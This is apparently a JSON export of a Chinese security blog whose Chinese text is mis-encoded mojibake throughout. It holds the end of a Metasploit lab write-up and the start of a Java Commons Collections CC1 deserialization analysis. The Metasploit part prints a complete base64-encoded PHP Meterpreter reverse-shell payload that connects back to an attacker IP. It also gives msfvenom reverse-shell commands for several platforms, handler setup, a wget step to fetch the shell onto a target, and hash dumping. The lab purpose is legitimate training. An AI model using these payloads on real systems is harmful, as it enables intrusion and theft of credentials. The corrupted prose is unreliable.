æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸæ‹¿åˆ°shellï¼Œè¿™é‡Œå´ä¸çŸ¥é“ç”¨ä»€ä¹ˆå‘½ä»¤æ‰¾flag.txtï¼Œçœ‹äº†wpå‘ç°ä½¿ç”¨search åˆ©ç”¨hashdumpä¸‹è½½ç›®æ ‡hashï¼Œåˆ©ç”¨åœ¨çº¿å·¥å…·ç ´è§£ 0x06 Msfvenom Msfvenom å–ä»£äº† Msfpayload å’Œ Msfencodeï¼Œå…è®¸æ‚¨ç”Ÿæˆæœ‰æ•ˆè´Ÿè½½ã€‚ Msfvenom å°†å…è®¸æ‚¨è®¿é—® Metasploit æ¡†æ¶ä¸­å¯ç”¨çš„æ‰€æœ‰æœ‰æ•ˆè´Ÿè½½ã€‚ Msfvenom å…è®¸æ‚¨ä¸ºè®¸å¤šä¸åŒçš„ç›®æ ‡ç³»ç»Ÿï¼ˆAppleã€Windowsã€Androidã€Linux ç­‰ï¼‰åˆ›å»ºå¤šç§ä¸åŒæ ¼å¼ï¼ˆPHPã€exeã€dllã€elf ç­‰ï¼‰çš„æœ‰æ•ˆè´Ÿè½½ã€‚ è¾“å‡ºæ ¼å¼ æ‚¨å¯ä»¥ç”Ÿæˆç‹¬ç«‹çš„æœ‰æ•ˆè´Ÿè½½ï¼ˆä¾‹å¦‚ Meterpreter çš„ Windows å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æˆ–è·å–å¯ç”¨çš„åŸå§‹æ ¼å¼ï¼ˆä¾‹å¦‚ pythonï¼‰ã€‚ msfvenom --list formats å‘½ä»¤å¯ç”¨äºåˆ—å‡ºæ”¯æŒçš„è¾“å‡ºæ ¼å¼ ç¼–ç  ä¸æŸäº›è§‚ç‚¹ç›¸åï¼Œç¼–ç å™¨çš„ç›®çš„å¹¶ä¸æ˜¯ç»•è¿‡ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…çš„é˜²ç—…æ¯’è½¯ä»¶ã€‚é¡¾åæ€ä¹‰ï¼Œå®ƒä»¬å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œç¼–ç ã€‚è™½ç„¶å®ƒå¯ä»¥æœ‰æ•ˆå¯¹æŠ—æŸäº›é˜²ç—…æ¯’è½¯ä»¶ï¼Œä½†ä½¿ç”¨ç°ä»£æ··æ·†æŠ€æœ¯æˆ–å­¦ä¹ æ–¹æ³•æ³¨å…¥ shellcode æ˜¯è§£å†³è¯¥é—®é¢˜çš„æ›´å¥½æ–¹æ³•ã€‚ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†ç¼–ç çš„ç”¨æ³•ï¼ˆå¸¦æœ‰ -e å‚æ•°ã€‚PHP ç‰ˆæœ¬çš„ Meterpreter é‡‡ç”¨ Base64 ç¼–ç ï¼Œè¾“å‡ºæ ¼å¼ä¸º raw ã€‚ root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of php/base64 php/base64 succeeded with size 1507 (iteration=0) php/base64 chosen with final size 1507 Payload size: 1507 bytes eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7)); root@ip-10-10-186-44:~# å¤„ç†ç¨‹åº ä¸ä½¿ç”¨åå‘ shell çš„æ¼æ´ç±»ä¼¼ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿæ¥å— MSFvenom æœ‰æ•ˆè´Ÿè½½ç”Ÿæˆçš„ä¼ å…¥è¿æ¥ã€‚å½“ä½¿ç”¨exploitæ¨¡å—æ—¶ï¼Œè¿™éƒ¨åˆ†ç”±exploitæ¨¡å—è‡ªåŠ¨å¤„ç†ï¼Œä½ ä¼šè®°å¾—è®¾ç½®åå‘shellæ—¶ payload options æ ‡é¢˜æ˜¯å¦‚ä½•å‡ºç°çš„ã€‚é€šå¸¸ç”¨äºæ¥æ”¶æ¥è‡ªç›®æ ‡çš„è¿æ¥çš„æœ¯è¯­æ˜¯â€œæ•è· shellâ€ã€‚ä½¿ç”¨å¤„ç†ç¨‹åºå¯ä»¥è½»æ¾æ•è· MSFvenom æœ‰æ•ˆè´Ÿè½½ä¸­ç”Ÿæˆçš„åå‘ shell æˆ– Meterpreter å›è°ƒã€‚ ä»¥ä¸‹åœºæ™¯å¯èƒ½å¾ˆç†Ÿæ‚‰ï¼›æˆ‘ä»¬å°†åˆ©ç”¨ DVWAï¼ˆè¯¥æ­»çš„æ˜“å—æ”»å‡»çš„ Web åº”ç”¨ç¨‹åºï¼‰ä¸­å­˜åœ¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚å¯¹äºæœ¬ä»»åŠ¡ä¸­çš„ç»ƒä¹ ï¼Œæ‚¨å°†éœ€è¦åœ¨å¦ä¸€ä¸ªç›®æ ‡ç³»ç»Ÿä¸Šå¤åˆ¶ç±»ä¼¼çš„åœºæ™¯ï¼Œæ­¤å¤„ä½¿ç”¨ DVWA è¿›è¡Œè¯´æ˜ã€‚æ¼æ´åˆ©ç”¨æ­¥éª¤æ˜¯ï¼š ä½¿ç”¨ MSFvenom ç”Ÿæˆ PHP shell å¯åŠ¨ Metasploit å¤„ç†ç¨‹åº æ‰§è¡Œ PHP shell MSFvenom å°†éœ€è¦æœ‰æ•ˆè´Ÿè½½ã€æœ¬åœ°è®¡ç®—æœº IP åœ°å€ä»¥åŠæœ‰æ•ˆè´Ÿè½½å°†è¿æ¥çš„æœ¬åœ°ç«¯å£ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œ10.0.2.19æ˜¯æ”»å‡»ä¸­ä½¿ç”¨çš„AttackBoxçš„IPåœ°å€ï¼Œå¹¶ä¸”é€‰æ‹©äº†æœ¬åœ°ç«¯å£7777ã€‚ root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder specified, outputting raw payload Payload size: 3020 bytes root@ip-10-0-2-19:~# è¯·æ³¨æ„ï¼šè¾“å‡º PHP æ–‡ä»¶å°†é”™è¿‡æ³¨é‡Šçš„èµ·å§‹ PHP æ ‡è®°å’Œç»“æŸæ ‡è®° ( ?&gt; )ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ åº”ç¼–è¾‘reverse_shell.php æ–‡ä»¶ä»¥å°†å…¶è½¬æ¢ä¸ºå¯ç”¨çš„PHP æ–‡ä»¶ã€‚ ä¸‹é¢ï¼šä»æ–‡ä»¶å¼€å¤´åˆ é™¤çš„æ³¨é‡Šã€‚ ä¸‹å›¾ï¼šæ·»åŠ äº†ç»“æŸæ ‡ç­¾ æˆ‘ä»¬å°†ä½¿ç”¨ Multi Handler æ¥æ¥æ”¶ä¼ å…¥çš„è¿æ¥ã€‚è¯¥æ¨¡å—å¯ä»¥ä¸ use exploit/multi/handler å‘½ä»¤ä¸€èµ·ä½¿ç”¨ã€‚ å¤šå¤„ç†ç¨‹åºæ”¯æŒæ‰€æœ‰ Metasploit æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ä¸”å¯ç”¨äº Meterpreter ä»¥åŠå¸¸è§„ shellã€‚ è¦ä½¿ç”¨è¯¥æ¨¡å—ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®æœ‰æ•ˆè´Ÿè½½å€¼ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º php/reverse_php ï¼‰ã€LHOST å’Œ LPORT å€¼ã€‚ msf6 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) &gt; set payload php/reverse_php payload =&gt; php/reverse_php msf5 exploit(multi/handler) &gt; set lhost 10.0.2.19 lhost =&gt; 10.0.2.19 msf6 exploit(multi/handler) &gt; set lport 7777 lport =&gt; 7777 msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (php/reverse_php): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.19 yes The listen address (an interface may be specified) LPORT 7777 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf6 exploit(multi/handler) &gt; ä¸€æ—¦ä¸€åˆ‡è®¾ç½®å®Œæ¯•ï¼Œæˆ‘ä»¬å°† run å¤„ç†ç¨‹åºå¹¶ç­‰å¾…ä¼ å…¥è¿æ¥ã€‚ msf6 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.186.44:7777 å½“åå‘shellè¢«è§¦å‘æ—¶ï¼Œè¿æ¥å°†è¢«multi/handleræ¥æ”¶å¹¶ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªshellã€‚ å¦‚æœæœ‰æ•ˆè´Ÿè½½è®¾ç½®ä¸º Meterpreterï¼ˆä¾‹å¦‚ï¼Œä»¥ Windows å¯æ‰§è¡Œæ ¼å¼ï¼‰ï¼Œåˆ™ multi/handler å°†ä¸ºæˆ‘ä»¬æä¾› Meterpreter shellã€‚ å…¶ä»–æœ‰æ•ˆè´Ÿè½½ æ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„é…ç½®ï¼ˆæ“ä½œç³»ç»Ÿã€å®‰è£…çš„ç½‘ç»œæœåŠ¡å™¨ã€å®‰è£…çš„è§£é‡Šå™¨ç­‰ï¼‰ï¼Œmsfvenom å¯ç”¨äºåˆ›å»ºå‡ ä¹æ‰€æœ‰æ ¼å¼çš„æœ‰æ•ˆè´Ÿè½½ã€‚ä»¥ä¸‹æ˜¯æ‚¨ç»å¸¸ä½¿ç”¨çš„ä¸€äº›ç¤ºä¾‹ï¼š åœ¨æ‰€æœ‰è¿™äº›ç¤ºä¾‹ä¸­ï¼ŒLHOST å°†æ˜¯æ”»å‡»è®¡ç®—æœºçš„ IP åœ°å€ï¼ŒLPORT å°†æ˜¯å¤„ç†ç¨‹åºä¾¦å¬çš„ç«¯å£ã€‚ Linux å¯æ‰§è¡Œå’Œå¯é“¾æ¥æ ¼å¼ (elf) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf .elf æ ¼å¼ä¸ Windows ä¸­çš„ .exe æ ¼å¼ç›¸å½“ã€‚è¿™äº›æ˜¯ Linux çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯èƒ½ä»ç„¶éœ€è¦ç¡®ä¿å®ƒä»¬åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚ä¾‹å¦‚ï¼Œä¸€æ—¦ç›®æ ‡è®¡ç®—æœºä¸Šæœ‰ shell.elf æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨ chmod +x shell.elf å‘½ä»¤æˆäºˆå¯æ‰§è¡Œæƒé™ã€‚å®Œæˆåï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨ç›®æ ‡è®¡ç®—æœºå‘½ä»¤è¡Œä¸Šé”®å…¥ ./shell.elf æ¥è¿è¡Œæ­¤æ–‡ä»¶ã€‚ Windows è§†çª— msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp Python msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py ä¸Šé¢çš„æ‰€æœ‰ç¤ºä¾‹éƒ½æ˜¯åå‘è´Ÿè½½ã€‚è¿™æ„å‘³ç€æ‚¨éœ€è¦è®©exploit/multi/handleræ¨¡â€‹â€‹å—åœ¨æ‚¨çš„æ”»å‡»æœºå™¨ä¸Šä¾¦å¬æ‰èƒ½ä½œä¸ºå¤„ç†ç¨‹åºå·¥ä½œã€‚æ‚¨éœ€è¦ä½¿ç”¨æœ‰æ•ˆè´Ÿè½½ã€LHOST å’Œ LPORT å‚æ•°ç›¸åº”åœ°è®¾ç½®å¤„ç†ç¨‹åºã€‚è¿™äº›å€¼å°†ä¸æ‚¨åœ¨åˆ›å»º msfvenom è´Ÿè½½æ—¶ä½¿ç”¨çš„å€¼ç›¸åŒã€‚ æ”»å‡»æœºç”Ÿæˆelfæ¶æ„æ–‡ä»¶è¿›è¡Œåå¼¹shellï¼Œä¹‹åå¼€å¯httpæœåŠ¡å™¨ï¼Œè¿›å…¥é¶æœºé€šè¿‡wgetä¸‹è½½å¯¹åº”çš„shellæ–‡ä»¶ ä¹‹åæ”»å‡»æœºè¿›å…¥msfconsoleé€‰æ‹©ç›‘å¬payloadï¼Œè¿™é‡Œä¼¼ä¹åªèƒ½é€‰æ‹©linux/x86ä¹‹ç±»çš„ï¼Œæˆ‘ç”¨äº†ä¸€ä¸ªphpçš„ç›‘å¬è„šæœ¬å´ä¸è¡Œ æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellï¼Œä½¿ç”¨ååˆ©ç”¨æ¨¡å—è½¬å‚¨ç³»ç»Ÿä¸Šå…¶ä»–ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚ 0x07 æ€»ç»“ ç°åœ¨ä½ åº”è¯¥æ›´å¥½åœ°ç†è§£äº† Metasploit å¦‚ä½•å¸®åŠ©ä½ è¯†åˆ«ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ½œåœ¨æ¼æ´å¹¶åˆ©ç”¨è¿™äº›æ¼æ´ï¼›ä½ è¿˜èƒ½çœ‹åˆ°Metasploitçš„æ•°æ®åº“ç‰¹æ€§å¦‚ä½•å¸®åŠ©ä½ å¼€å±•é’ˆå¯¹å¤šä¸ªæ½œåœ¨ç›®æ ‡çš„æ¸—é€æµ‹è¯•ã€‚ æœ€åï¼Œä½ åº”è¯¥å·²ç»è·å¾—äº†ä¸€äº›å…³äºmsfvenom å’Œåˆ›å»ºç‹¬ç«‹ Meterpreter æœ‰æ•ˆè½½è·çš„ç»éªŒï¼Œåœ¨ä½ å¯ä»¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ç³»ç»Ÿæˆ–å…·æœ‰å°†æ–‡ä»¶ä¸‹è½½åˆ°ç›®æ ‡ç³»ç»Ÿçš„èƒ½åŠ›çš„æƒ…å†µä¸‹ï¼Œè¿™å°¤å…¶æœ‰å¸®åŠ©ã€‚ æ€»ä¹‹ï¼ŒMeterpreter æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œåœ¨åæœŸæ¼æ´åˆ©ç”¨é˜¶æ®µæä¾›äº†è®¸å¤šæ˜“äºä½¿ç”¨çš„ç‰¹æ€§ã€‚","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"Javaååºåˆ—åŒ–å…¥é—¨ä¹‹CC1é“¾åˆ†æ","path":"/2024/03/18/java-fan-xu-lie-hua-zhi-cc1-lian/","content":"Apache CC1é“¾åˆ†æ Commons Collectionsç®€ä»‹ Commons Collectionsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå®ƒæä¾›äº†ä¸€ç»„å¯å¤ç”¨çš„æ•°æ®ç»“æ„å’Œç®—æ³• çš„å®ç°ï¼Œæ—¨åœ¨æ‰©å±•å’Œå¢å¼ºJavaé›†åˆæ¡†æ¶ï¼Œä»¥ä¾¿æ›´å¥½åœ°æ»¡è¶³ä¸åŒç±»å‹åº”ç”¨çš„éœ€æ±‚ã€‚è¯¥é¡¹ç›®åŒ…å«äº†å¤šç§ä¸åŒ ç±»å‹çš„é›†åˆç±»ã€è¿­ä»£å™¨ã€é˜Ÿåˆ—ã€å †æ ˆã€æ˜ å°„ã€åˆ—è¡¨ã€é›†ç­‰æ•°æ®ç»“æ„å®ç°ï¼Œä»¥åŠè®¸å¤šå®ç”¨ç¨‹åºç±»å’Œç®—æ³•å® ç°ã€‚å®ƒçš„ä»£ç è´¨é‡è¾ƒé«˜ï¼Œè¢«å¹¿æ³›åº”ç”¨äºJavaåº”ç”¨ç¨‹åºå¼€å‘ä¸­ã€‚ Commons Collections 3.1 ç‰ˆæœ¬çš„åˆ©ç”¨é“¾è¡ç”Ÿå‡ºå¤šä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ–¹å¼ï¼Œä½†å…¶æ ¸å¿ƒéƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œä¸åŒä¹‹ å¤„åœ¨äºä¸­é—´è¿‡ç¨‹çš„æ„é€ ã€‚Ysoserial ååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ä¸­æä¾›äº†å‡ ç§åˆ©ç”¨æ–¹å¼ï¼š æœ¬æ–‡åˆ†æCommons Collections3.2.1ç‰ˆæœ¬ä¸‹çš„ä¸€æ¡æœ€å¥½ç”¨çš„ååºåˆ—åŒ–æ¼æ´é“¾ï¼Œè¿™æ¡æ”»å‡»é“¾è¢«ç§°ä¸ºCC1 é“¾ã€‚ æ­¤åŒ…çš„ç±»åŒ…å«ä¸‹é¢ä¸¤ä¸ªï¼Œéœ€è¦é‡ç‚¹å…³æ³¨ï¼š Map Commons Collectionsåœ¨java.util.Mapçš„åŸºç¡€ä¸Šæ‰©å±•äº†å¾ˆå¤šæ¥å£å’Œç±»ï¼Œæ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ˜¯ BidiMapã€MultiMapå’ŒLazyMapã€‚è·ŸBagå’ŒBufferç±»ä¼¼ï¼ŒCommons Collectionsä¹Ÿæä¾›äº†ä¸€ä¸ª MapUtilsã€‚ æ‰€è°“BidiMapï¼Œç›´è¯‘å°±æ˜¯åŒå‘Mapï¼Œå¯ä»¥é€šè¿‡keyæ‰¾åˆ°valueï¼Œä¹Ÿå¯ä»¥é€šè¿‡valueæ‰¾åˆ°keyï¼Œè¿™åœ¨æˆ‘ä»¬ æ—¥å¸¸çš„ä»£ç -åç§°åŒ¹é…çš„æ—¶å€™å¾ˆæ–¹ä¾¿ï¼šå› ä¸ºæˆ‘ä»¬é™¤äº†éœ€è¦é€šè¿‡ä»£ç æ‰¾åˆ°åç§°ä¹‹å¤–ï¼Œå¾€å¾€ä¹Ÿéœ€è¦å¤„ç† ç”¨æˆ·è¾“å…¥çš„åç§°ï¼Œç„¶åè·å–å…¶ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯BidiMapå½“ä¸­ä¸å…‰keyä¸èƒ½é‡å¤ï¼Œvalueä¹Ÿä¸å¯ ä»¥ã€‚ æ‰€è°“MultiMapï¼Œå°±æ˜¯è¯´ä¸€ä¸ªkeyä¸å†æ˜¯ç®€å•çš„æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ç»„å¯¹è±¡ï¼Œadd()å’Œremove()çš„ æ—¶å€™è·Ÿæ™®é€šçš„Mapæ— å¼‚ï¼Œåªæ˜¯åœ¨get()æ—¶è¿”å›ä¸€ä¸ªCollectionï¼Œåˆ©ç”¨MultiMapï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ å¾€ä¸€ä¸ªkeyä¸Šæ”¾æ•°é‡ä¸å®šçš„å¯¹è±¡ï¼Œä¹Ÿå°±å®ç°äº†ä¸€å¯¹å¤šã€‚ æ‰€è°“LazyMapï¼Œæ„æ€å°±æ˜¯è¿™ä¸ªMapä¸­çš„é”®/å€¼å¯¹ä¸€å¼€å§‹å¹¶ä¸å­˜åœ¨ï¼Œå½“è¢«è°ƒç”¨åˆ°æ—¶æ‰åˆ›å»ºã€‚ https://www.iteye.com/blog/duohuoteng-1630329 Transformer æˆ‘ä»¬æœ‰æ—¶å€™éœ€è¦å°†æŸä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ä¾›å¦ä¸€ç»„æ–¹æ³•è°ƒç”¨ï¼Œè€Œè¿™ä¸¤ç±»å¯¹è±¡çš„ç±»å‹æœ‰å¯èƒ½å¹¶ä¸ æ˜¯å‡ºäºåŒä¸€ä¸ªç»§æ‰¿ä½“ç³»çš„ï¼Œæˆ–è€…è¯´å‡ºäº†å¾ˆåŸºæœ¬çš„Objectä¹‹å¤–æ²¡æœ‰å…±åŒçš„çˆ¶ç±»ï¼Œæˆ–è€…æˆ‘ä»¬æ ¹æœ¬ä¸å…³å¿ƒ ä»–ä»¬æ˜¯ä¸æ˜¯æœ‰å…¶ä»–ç»§æ‰¿å…³ç³»ï¼Œç”šè‡³å°±æ˜¯åŒä¸€ä¸ªç±»çš„å®ä¾‹åªæ˜¯å¯¹æˆ‘ä»¬è€Œè¨€æ— æ‰€è°“ï¼Œæˆ‘ä»¬ä¸ºäº†å®ƒèƒ½å¤Ÿè¢« åç»­çš„è°ƒç”¨è€…æœ‰æ„ä¹‰çš„è¯†åˆ«å’Œå¤„ç†ï¼Œåœ¨è¿™æ ·çš„æƒ…å½¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Transformerã€‚é™¤äº†åŸºæœ¬çš„è½¬ å‹Transformerä¹‹å¤–ï¼ŒCommons Collectionsè¿˜æä¾›äº†Transformeré“¾å’Œå¸¦æ¡ä»¶çš„Transformerï¼Œ ä½¿å¾—æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç»„è£…å‡ºæœ‰æ„ä¹‰çš„è½¬å‹é€»è¾‘ã€‚ https://blog.csdn.net/liliugen/article/details/83298363 ç¯å¢ƒæ­å»º ç”±äºå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ commons-collections3.1-3.2.1 jdk 8u71ä¹‹åå·²ä¿®å¤ä¸å¯ç”¨ï¼Œè¿™é‡Œä¸‹è½½JDK-8u65ï¼šhttps://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html ä¸‹è½½å®‰è£…ä¹‹åï¼Œé…ç½®åˆ°ideaä¸­ï¼Œæ·»åŠ å¸¸è§„Mavené¡¹ç›®ï¼Œé€‰æ‹©æˆ‘ä»¬åˆšä¸‹è½½çš„jdk ç„¶åé…ç½®Mavenä¾èµ–ä¸‹è½½CommonsCollections3.2.1ç‰ˆæœ¬ã€‚å¤åˆ¶åˆ°pom.xmlä¸­å³å¯ &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ç”±äºæˆ‘ä»¬åˆ†ææ—¶è¦æ¶‰åŠçš„jdkæºç ï¼Œæ‰€ä»¥è¦æŠŠjdkçš„æºç ä¹Ÿä¸‹è½½ä¸‹æ¥æ–¹ä¾¿æˆ‘ä»¬åˆ†æã€‚ å› ä¸ºjdkè‡ªå¸¦çš„åŒ…é‡Œé¢æœ‰äº›æ–‡ä»¶æ˜¯åç¼–è¯‘çš„.classæ–‡ä»¶ï¼Œæˆ‘ä»¬æ²¡æ³•æ¸…æ¥šçš„çœ‹æ‡‚ä»£ç ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬è°ƒè¯•ï¼Œæˆ‘ä»¬éœ€è¦å°†ä»–ä»¬è½¬å˜ä¸º.javaçš„æ–‡ä»¶ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å®‰è£…ç›¸åº”çš„æºç :https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 ç‚¹å‡»å·¦ä¸‹è§’çš„zipå³å¯ä¸‹è½½ï¼Œç„¶åè§£å‹ã€‚å†è¿›å…¥åˆ°ç›¸åº”JDKçš„æ–‡ä»¶å¤¹ä¸­ï¼Œé‡Œé¢æœ¬æ¥å°±æœ‰ä¸ªsrc.zipçš„å‹ç¼© åŒ…ï¼Œå°†å…¶è§£å‹ï¼Œç„¶åæŠŠåˆšåˆšä¸‹è½½çš„æºç åŒ…(jdk-af660750b2f4.zip)ä¸­/src/share/classesä¸‹çš„sunæ–‡ä»¶å¤¹æ‹· è´åˆ°srcæ–‡ä»¶å¤¹ä¸­å»ã€‚ æ‰“å¼€IDEAï¼Œé€‰æ‹©æ–‡ä»¶ â€”&gt;é¡¹ç›®ç»“æ„ â€”&gt;SDK â€”&gt;æºè·¯å¾„ â€”&gt;æŠŠsrcæ–‡ä»¶å¤¹æ·»åŠ åˆ°æºè·¯å¾„ä¸‹ï¼Œä¿å­˜å³å¯ã€‚ ä½†æˆ‘åšäº†å¦‚ä¸Šé…ç½®å‘ç°æ²¡æœ‰sunç›®å½•çš„æ˜¾ç¤ºï¼Œåˆçœ‹äº†å‡ ç¯‡æ–‡ç« å‘ç°ï¼Œä¼¼ä¹æ˜¯å°†srcç›®å½•æ·»åŠ åˆ°ç±»è·¯å¾„ä¸­ å¦‚ä¸‹å›¾ä¸å†æ˜¾ç¤º.classåˆ™è¡¨ç¤ºé…ç½®æˆåŠŸ ååºåˆ—åŒ–åˆ†æ æˆ‘ä»¬åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•ä¸€èˆ¬æ˜¯å¯»æ‰¾åˆ°æŸä¸ªå¸¦æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼Œç„¶åæº¯æºï¼Œçœ‹çœ‹å“ªä¸ªç±»ä¸­çš„æ–¹æ³•æœ‰è°ƒç”¨å±é™©æ–¹æ³•(æœ‰ç‚¹åƒå¥—å¨ƒï¼Œè¿™ä¸ªç±»ä¸­çš„æŸä¸ªæ–¹æ³•è°ƒç”¨äº†ä¸‹ä¸ªç±»ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œä¸€æ­¥æ­¥å¥—ä¸‹å»)ï¼Œå¹¶ä¸”ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£ï¼Œç„¶åå†ä¾æ¬¡å‘ä¸Šå›æº¯ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé‡å†™äº†readObjectæ–¹æ³•çš„ç±»ï¼Œ å¹¶ä¸”ç¬¦åˆæ¡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªå°±æ˜¯èµ·å§‹ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç±»ä¸€æ­¥æ­¥çš„è°ƒç”¨åˆ°å±é™©æ–¹æ³•(è¿™é‡Œ ä»¥\"Runtimeä¸­çš„execæ–¹æ³•ä¸ºä¾‹\")ï¼Œè¿™å°±æ˜¯å¤§è‡´çš„Javaæ¼æ´é“¾æµç¨‹ã€‚ 